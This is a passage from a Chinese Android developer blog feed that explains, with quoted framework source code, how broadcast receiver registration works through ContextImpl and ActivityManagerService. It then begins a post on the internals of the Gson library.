class="line">1</span><br></pre></td><td class="code"><pre><span class="line">registerReceiver(<span class="name">receiver</span>, intentFilter)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>这一行代码就是注册广播，那它做了什么呢？点进去看</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Intent registerReceiver(</span><br><span class="line">        BroadcastReceiver receiver, IntentFilter filter) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">return</span> mBase.<span class="title">registerReceiver</span><span class="params">(receiver, filter)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Intent registerReceiver(</span><br><span class="line">        BroadcastReceiver receiver, IntentFilter filter,</span><br><span class="line">        String broadcastPermission, Handler scheduler) &#123;</span><br><span class="line">        <span class="keyword">return</span> mBase.registerReceiver(receiver, filter, broadcastPermission,</span><br><span class="line">                scheduler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@hide</span> */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Intent registerReceiverAsUser(</span><br><span class="line">        BroadcastReceiver receiver, UserHandle user, IntentFilter filter,</span><br><span class="line">        String broadcastPermission, Handler scheduler) &#123;</span><br><span class="line">        <span class="keyword">return</span> mBase.registerReceiverAsUser(receiver, user, filter, broadcastPermission,</span><br><span class="line">                scheduler);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们就进入到了ContextWrapper文件中，而第三个方法我们暂时不用管他，因为它是被@hide标记了的，只关心前面两个方法。而前面的两个方法又分别调用了mBase也就是一个Context中对应的方法</p><p>对于ContextWarapper来说，它只是Context的一个代理类，也就是说它是为Context服务的，一些小工作也就是不是核心的东西Context都是交给它来做的。而一些核心工作最终又返还给Context来处理。这样就可以在一定程度上实现解耦以及工作职责的分离，Context完全不需要考虑那些它本来不需要也不想知道的事情。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Proxying implementation of Context that simply delegates all of its calls to</span></span><br><span class="line"><span class="comment"> * another Context.  Can be subclassed to modify behavior without changing</span></span><br><span class="line"><span class="comment"> * the original Context.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">ContextWrapper</span> <span class="keyword">extends</span> <span class="title">Context</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>Context:</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">public</span> <span class="selector-tag">abstract</span> <span class="selector-tag">Intent</span> <span class="selector-tag">registerReceiver</span>(<span class="variable">@Nullable</span> BroadcastReceiver receiver,IntentFilter filter);</span><br></pre></td></tr></table></figure><p>我们的Context也是一个抽象类，它的具体实现是在ContextImpl中的。Context里面实际上就是一些资源的获取的工作，它还有几个子类就是Activity，Application和Service</p><p>ContextImpl:</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line"><span class="keyword">public</span> Intent registerReceiver(BroadcastReceiver receiver, IntentFilter <span class="built_in">filter</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> registerReceiver(receiver, <span class="built_in">filter</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line"><span class="keyword">public</span> Intent registerReceiver(BroadcastReceiver receiver, IntentFilter <span class="built_in">filter</span>,</span><br><span class="line">        <span class="keyword">String</span> broadcastPermission, Handler scheduler) &#123;</span><br><span class="line">    <span class="keyword">return</span> registerReceiverInternal(receiver, getUserId(),</span><br><span class="line">            <span class="built_in">filter</span>, broadcastPermission, scheduler, getOuterContext());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line"><span class="keyword">public</span> Intent registerReceiverAsUser(BroadcastReceiver receiver, UserHandle user,</span><br><span class="line">        IntentFilter <span class="built_in">filter</span>, <span class="keyword">String</span> broadcastPermission, Handler scheduler) &#123;</span><br><span class="line">    <span class="keyword">return</span> registerReceiverInternal(receiver, user.getIdentifier(),</span><br><span class="line">            <span class="built_in">filter</span>, broadcastPermission, scheduler, getOuterContext());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Intent registerReceiverInternal(BroadcastReceiver receiver, <span class="built_in">int</span> userId,</span><br><span class="line">        IntentFilter <span class="built_in">filter</span>, <span class="keyword">String</span> broadcastPermission,</span><br><span class="line">        Handler scheduler, Context context) &#123;</span><br><span class="line">    IIntentReceiver rd = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (receiver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mPackageInfo != <span class="keyword">null</span> &amp;&amp; context != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (scheduler == <span class="keyword">null</span>) &#123;</span><br><span class="line">                scheduler = mMainThread.getHandler();</span><br><span class="line">            &#125;</span><br><span class="line">            rd = mPackageInfo.getReceiverDispatcher(</span><br><span class="line">                receiver, context, scheduler,</span><br><span class="line">                mMainThread.getInstrumentation(), <span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (scheduler == <span class="keyword">null</span>) &#123;</span><br><span class="line">                scheduler = mMainThread.getHandler();</span><br><span class="line">            &#125;</span><br><span class="line">            rd = <span class="keyword">new</span> LoadedApk.ReceiverDispatcher(</span><br><span class="line">                    receiver, context, scheduler, <span class="keyword">null</span>, <span class="keyword">true</span>).getIIntentReceiver();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ActivityManagerNative.getDefault().registerReceiver(</span><br><span class="line">                mMainThread.getApplicationThread(), mBasePackageName,</span><br><span class="line">                rd, <span class="built_in">filter</span>, broadcastPermission, userId);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好了，这下就一目了然，我们只有两个参数的registerReceiver最终也是调用了四个参数的方法，而后面的两个参数broadcastPermission以及Handler直接被设置为空。</p><p>最终的一个工作都是交给registerReceiverInternal来做的。首当其冲的就是这个IIntentReceiver类，这个类是做什么的呢？它实际上就是一个binder实体，通过这个东西我们就可以实现跨进程的信息传递了.它是由ReceiveDispather来管理的</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">rd = mPackageInfo.getReceiverDispatcher(</span><br><span class="line">                    receiver, <span class="built_in">context</span>, scheduler,</span><br><span class="line">                    mMainThread.getInstrumentation(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">public IIntentReceiver getReceiverDispatcher(BroadcastReceiver r,</span><br><span class="line">            Context <span class="built_in">context</span>, Handler handler,</span><br><span class="line">            Instrumentation instrumentation, boolean registered) &#123;</span><br><span class="line">        synchronized (mReceivers) &#123;</span><br><span class="line">            LoadedApk.ReceiverDispatcher rd = null;</span><br><span class="line">            ArrayMap&lt;BroadcastReceiver, LoadedApk.ReceiverDispatcher&gt; <span class="built_in">map</span> = null;</span><br><span class="line">            <span class="keyword">if</span> (registered) &#123;</span><br><span class="line">                <span class="built_in">map</span> = mReceivers.<span class="built_in">get</span>(<span class="built_in">context</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">map</span> != null) &#123;</span><br><span class="line">                    rd = <span class="built_in">map</span>.<span class="built_in">get</span>(r);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (rd == null) &#123;</span><br><span class="line">                rd = <span class="built_in">new</span> ReceiverDispatcher(r, <span class="built_in">context</span>, handler,</span><br><span class="line">                        instrumentation, registered);</span><br><span class="line">                <span class="keyword">if</span> (registered) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">map</span> == null) &#123;</span><br><span class="line">                        <span class="built_in">map</span> = <span class="built_in">new</span> ArrayMap&lt;BroadcastReceiver, LoadedApk.ReceiverDispatcher&gt;();</span><br><span class="line">                        mReceivers.<span class="built_in">put</span>(<span class="built_in">context</span>, <span class="built_in">map</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">map</span>.<span class="built_in">put</span>(r, rd);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                rd.validate(<span class="built_in">context</span>, handler);</span><br><span class="line">            &#125;</span><br><span class="line">            rd.mForgotten = <span class="literal">false</span>;</span><br><span class="line">            <span class="built_in">return</span> rd.getIIntentReceiver();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后，它返回了一个ActivityManagerNative.getDefault().registerReceiver()方法，继续跟进可以知道ActivityManagerNative.getDefault()实际上就是获取一个唯一的IActivityManager实例，它是一个单例模式。</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Retrieve the system's default/global activity manager.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="function">IActivityManager <span class="title">getDefault</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">return</span> gDefault.<span class="title">get</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton&lt;IActivityManager&gt; gDefault = <span class="keyword">new</span> Singleton&lt;IActivityManager&gt;() &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="function">IActivityManager <span class="title">create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            IBinder b = ServiceManager.getService(<span class="string">"activity"</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span>) &#123;</span><br><span class="line">                Log.v(<span class="string">"ActivityManager"</span>, <span class="string">"default service binder = "</span> + b);</span><br><span class="line">            &#125;</span><br><span class="line">            IActivityManager am = asInterface(b);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span>) &#123;</span><br><span class="line">                Log.v(<span class="string">"ActivityManager"</span>, <span class="string">"default service = "</span> + am);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> am;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T mInstance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="function">T <span class="title">create</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="function">T <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mInstance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                mInstance = create();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> mInstance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么它返回的IActivityManager到底是谁呢？其实就是ActivityManagerService，简称AMS。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ActivityManagerService</span> <span class="keyword">extends</span> <span class="title">ActivityManagerNative</span></span></span><br><span class="line"><span class="class">        <span class="title">implements</span> <span class="title">Watchdog</span>.<span class="title">Monitor</span>, <span class="title">BatteryStatsImpl</span>.<span class="title">BatteryCallback</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>在我的博客<strong>杂谈——Android从启动到程序运行发生的事情</strong>中详解介绍到了AMS的功能，它实际上就是一个管理器，管理着非常多的东西，在系统中的作用极大。所有的Activity操作都是由Activity向他发出一个申请，它进行处理（比如向Zygote发送命令创建一个新的ActivityThread）之后返给Activity，Activity再交给Instrumentation来继续完成（例如生命周期的操作），而我们的注册广播和解除注册广播也是交给它来完成的。</p><p>由于对应的代码有点长，这里就不贴出来了，只是总括一下它以及sendBrodcast和unregister里面完成的东西。</p><h2 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a>一句话总结</h2><p>当一个广播进行发送时，它会被发送到AMS中并由它完成广播的传递，而AMS利用Binder机制，也就是上面的IIntentReceiver将他们传递到各个应用进程，应用进程再调用recevier的onReceive()的方法，这也就完成了一次广播的传递。</p><p>而对于注册广播来说，存在一个LoadApk对象，这个对象里面会包含关于本APK动态注册的所有receiver的哈希表，每当我们注册一个receiver，那么他就会被添加进入这个LoadApk的哈希表中。同时在我们注册的时候会记录用户对哪些receiver感兴趣，同一个Receiver可以注册多个IntentFilter，同样的也会使用一个ReceiverList来存储所有的IntentFilter信息。</p><p>所以当一个消息发来的时候，AMS会合并静态注册的表以及动态注册的表，同等优先级下动态注册的receiver在靠前的位置。匹配IntentFilter并查找对应的receiver哈希表，找到该Receiver，并利用Binder机制进行分发。</p><p>最后再安利一个网址，<strong><a href="https://android.googlesource.com/?format=HTML" target="_blank" rel="noopener">https://android.googlesource.com/?format=HTML</a></strong>，有很多代码Google处于安全性并没有直接暴露给开发者，所以在AndroidStudio中并不能查看到，例如上面的IIntentReceiver，如要想要查看的话就需要科学上网到上面的这个网址</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;广播是Android的四大组件之一，在Android的源码中也大量存在并使用了它，此外它也是一种常见的跨进程通信方式，由此可见它的重要性。&lt;/p&gt;
&lt;p&gt;这里就对广播的底层实现进行一个解析&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本文中间包含了广播的代码细节，可以直接查看最后的“一句话总结”&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Gson</title>
    <link href="http://imlzq.com/2016/06/06/Gson/"/>
    <id>http://imlzq.com/2016/06/06/Gson/</id>
    <published>2016-06-05T16:00:00.000Z</published>
    <updated>2018-04-27T08:03:07.391Z</updated>
    
    <content type="html"><![CDATA[<p>以前写了一篇关于如何使用GSon的文章: <a href="http://imlzq.com/2015/12/07/gson/">Json数据的解析_Gson</a></p><p>这里就对Gson的内部实现原理进行一个总结</p><a id="more"></a>    <h2 id="创建方法"><a href="#创建方法" class="headerlink" title="创建方法"></a>创建方法</h2><p>Gson可以由两种方式创建，一种是通过Gson.Builder()的方式，另一种则是通过new Gson()来创建。</p><p>那这两种创建方式有什么不同呢？</p><p>第一种Gson.Builder()的方法没有使用反射，而new Gson()是使用了反射的。</p><p>在Gson内部存在着TypeAdapter，也就是根据不同的类型来适配，党我们使用Gson.Builder()创建时，使用的是自定义的TypeAdapter而不是默认的TypeAdapter，因此也就出现了一个为反射，一个不是反射</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">Gson(Excluder excluder, FieldNamingStrategy fieldNamingPolicy, Map&lt;Type, InstanceCreator&lt;?&gt;&gt; instanceCreators, boolean serializeNulls, boolean complexMapKeySerialization, boolean generateNonExecutableGson, boolean htmlSafe, boolean prettyPrinting, boolean serializeSpecialFloatingPointValues, LongSerializationPolicy longSerializationPolicy, List&lt;TypeAdapterFactory&gt; typeAdapterFactories) &#123;</span><br><span class="line">        this.calls = new ThreadLocal();</span><br><span class="line">        this.typeTokenCache = Collections.synchronizedMap(new HashMap());</span><br><span class="line">        this.deserializationContext = new JsonDeserializationContext() &#123;</span><br><span class="line">            public &lt;T&gt; T deserialize(JsonElement json,<span class="built_in"> Type </span>typeOfT) throws JsonParseException &#123;</span><br><span class="line">                return Gson.this.fromJson(json, typeOfT);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        this.serializationContext = new JsonSerializationContext() &#123;</span><br><span class="line">            public JsonElement serialize(Object src) &#123;</span><br><span class="line">                return Gson.this.toJsonTree(src);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            public JsonElement serialize(Object src,<span class="built_in"> Type </span>typeOfSrc) &#123;</span><br><span class="line">                return Gson.this.toJsonTree(src, typeOfSrc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        this.constructorConstructor = new ConstructorConstructor(instanceCreators);</span><br><span class="line">        this.serializeNulls = serializeNulls;</span><br><span class="line">        this.generateNonExecutableJson = generateNonExecutableGson;</span><br><span class="line">        this.htmlSafe = htmlSafe;</span><br><span class="line">        this.prettyPrinting = prettyPrinting;</span><br><span class="line">        ArrayList factories = new ArrayList();</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.JSON_ELEMENT_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(ObjectTypeAdapter.FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(excluder);</span><br><span class="line">        factories.addAll(typeAdapterFactories);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.STRING_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.INTEGER_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.BOOLEAN_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.BYTE_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.SHORT_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.newFactory(Long.TYPE, Long.class, this.longAdapter(longSerializationPolicy)));</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.newFactory(Double.TYPE, Double.class, this.doubleAdapter(serializeSpecialFloatingPointValues)));</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.newFactory(Float.TYPE, Float.class, this.floatAdapter(serializeSpecialFloatingPointValues)));</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.NUMBER_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.CHARACTER_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.STRING_BUILDER_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.STRING_BUFFER_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.newFactory(BigDecimal.class, TypeAdapters.BIG_DECIMAL));</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.newFactory(BigInteger.class, TypeAdapters.BIG_INTEGER));</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.URL_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.URI_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.UUID_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.LOCALE_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.INET_ADDRESS_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.BIT_SET_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(DateTypeAdapter.FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.CALENDAR_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TimeTypeAdapter.FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(SqlDateTypeAdapter.FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.TIMESTAMP_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(ArrayTypeAdapter.FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.ENUM_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(TypeAdapters.CLASS_FACTORY);</span><br><span class="line">        factories.<span class="builtin-name">add</span>(new CollectionTypeAdapterFactory(this.constructorConstructor));</span><br><span class="line">        factories.<span class="builtin-name">add</span>(new MapTypeAdapterFactory(this.constructorConstructor, complexMapKeySerialization));</span><br><span class="line">        factories.<span class="builtin-name">add</span>(new ReflectiveTypeAdapterFactory(this.constructorConstructor, fieldNamingPolicy, excluder));</span><br><span class="line">        this.factories = Collections.unmodifiableList(factories);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那Gson如何判断我们使用的是哪一种方法创建呢？其实就是通过factories这个对象 add Factory的顺序来控制的。每次获取Adapter的时候都需要遍历Factories，而我们自定义的TypeAdapter在add时是会默认添加到靠前的位置。所以这样就避免了Gson的反射解析</p><h2 id="如何实现解析"><a href="#如何实现解析" class="headerlink" title="如何实现解析"></a>如何实现解析</h2><p>Gson中存在一个JsonParser类，它的作用就是将json串解析成JsonElement对象。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> JsonElement parse(<span class="keyword">String</span> json) throws JsonSyntaxException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.parse((Reader)(<span class="keyword">new</span> <span class="type">StringReader</span>(json)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> JsonElement parse(Reader json) throws JsonIOException, JsonSyntaxException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            JsonReader e = <span class="keyword">new</span> <span class="type">JsonReader</span>(json);</span><br><span class="line">            JsonElement element = <span class="built_in">this</span>.parse(e);</span><br><span class="line">            <span class="keyword">if</span>(!element.isJsonNull() &amp;&amp; e.peek() != JsonToken.END_DOCUMENT) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">JsonSyntaxException</span>(<span class="string">"Did not consume the entire document."</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> element;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedJsonException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">JsonSyntaxException</span>(var4);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">JsonIOException</span>(var5);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NumberFormatException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">JsonSyntaxException</span>(var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> JsonElement parse(JsonReader json) throws JsonIOException, JsonSyntaxException &#123;</span><br><span class="line">        boolean lenient = json.isLenient();</span><br><span class="line">        json.setLenient(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        JsonElement e;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            e = Streams.parse(json);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (StackOverflowError var8) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">JsonParseException</span>(<span class="string">"Failed parsing JSON source: "</span> + json + <span class="string">" to Json"</span>, var8);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (OutOfMemoryError var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">JsonParseException</span>(<span class="string">"Failed parsing JSON source: "</span> + json + <span 